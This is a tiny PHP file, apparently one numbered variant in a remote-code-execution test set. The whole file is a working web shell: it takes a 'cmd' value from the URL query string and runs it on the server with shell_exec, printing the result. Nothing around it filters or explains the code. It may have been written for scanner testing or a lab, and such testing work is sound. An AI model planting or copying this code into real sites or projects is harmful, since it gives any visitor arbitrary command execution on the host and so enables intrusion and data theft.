<?php
// RCE test variation #134
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>